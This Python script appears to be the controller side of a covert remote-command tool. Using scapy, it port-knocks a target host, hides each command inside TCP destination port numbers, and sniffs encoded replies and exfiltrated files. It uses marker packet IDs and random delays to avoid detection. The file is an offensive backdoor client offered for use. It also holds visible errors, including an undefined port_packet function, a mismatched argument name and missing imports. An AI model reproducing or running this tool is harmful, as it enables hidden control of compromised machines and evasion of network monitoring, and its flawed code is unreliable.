import time
import argparse
import logging
from random import uniform, randint
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES

MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
OUTPUT = []

def encrypt_val(text):
	secret = AES.new(MASTER_KEY)
	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
	cipher_text = base64.b64encode(secret.encrypt(tag_string))
	return cipher_text


def decrypt_val(cipher):
	secret = AES.new(MASTER_KEY)
	decrypted = secret.decrypt(base64.b64decode(cipher))
	result = decrypted.rstrip("\0")
	return result


def verify_root():
	if(os.getuid() != 0):
		exit("This program must be run with root/sudo")


def binary_to_file(binary):
	string = binascii.unhexlify('%x' % int(''.join(binary), 2))
	filename, data = string.split('\0')
	data = data.rstrip('\n')
	with open(filename, "wb") as f:
		f.write(''.join(binary))


def char_packet(dest, char1, char2=None):
	if(char2 is None):
		destport = ord(char1) << 8
	else:
		destport = (ord(char1) << 8) + ord(char2)
	return IP(dst=dest) / TCP(sport=80, dport=destport)


def get_srcport():
	if(args.sport is None):
		return 80
	elif(args.srcport == "random"):
		return randint(1500, 65535)
	else:
		return int(args.srcport)


def knock(destIP, ports):
	for port in ports:
		packet = IP(dst=destIP) / TCP(dport=port)
		send(packet)


def disconnect(dest):
	timeVar = time.gmtime().tm_min * time.gmtime().tm_hour
	sr1(port_packet(dest, 13098 + timeVar))
	delay_sleep()
	sr1(port_packet(dest, 11514 + timeVar))


def end_msg(dest):
	randPort = randint(1500, 65535)
	packet = IP(dst=dest, id=42424) / TCP(dport=randPort, sport=80)
	send(packet)


def delay_sleep():
	global args
	if(args.delay is None):
		return
	randRange = args.delay.split('-')
	size = len(randRange)
	if(size == 1):
		time.sleep(int(randRange[0]))
	elif(size == 2):
		sleeptime = uniform(int(randRange[0]), int(randRange[1]))
		print("Waiting for {}s".format(sleeptime))
		time.sleep(sleeptime)

	else:
		sys.exit("Invalid input for delay")


def get_result(packet):
	global OUTPUT
	if(packet[1].id == 42424):
		print(''.join(OUTPUT))
		OUTPUT = []
		return True
	elif(packet[1].id == 41414):
		binary_to_file(OUTPUT)
		OUTPUT = []
		return True
	dport = packet[2].dport
	char1 = chr((dport >> 8) & 0xff)
	char2 = chr(dport & 0xff)
	if(char2 is not None):
		OUTPUT.append("{}{}".format(char1, char2))
	else:
		OUTPUT.append("{}".format(char1))
	return False


def send_cmd(msg):
	for char1, char2 in zip(msg[0::2], msg[1::2]):
		delay_sleep()
		send(char_packet(args.destIP, char1, char2))
	if(len(msg) % 2):
		delay_sleep()
		send(char_packet(args.destIP, msg[len(msg) - 1]))
	end_msg(args.destIP)


def main():
	verify_root()
	ports = [2525, 14156, 6364]
	knock(args.destIP, ports)

	while True:
		msg = raw_input('Send: ')
		send_cmd(msg)
		sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
		

if __name__ == '__main__':
	parser = argparse.ArgumentParser("Python Covert Application")
	parser.add_argument('destIP', help="Destination address")
	parser.add_argument('-s', '--sport', help="Source port to send from, defaults to 80")
	parser.add_argument('-d', '--delay', help="Delay between each send in seconds. Range allowed with a dash")
	args = parser.parse_args()
	try:
		main()
	except KeyboardInterrupt:
		exit("Ctrl+C received. Exiting...")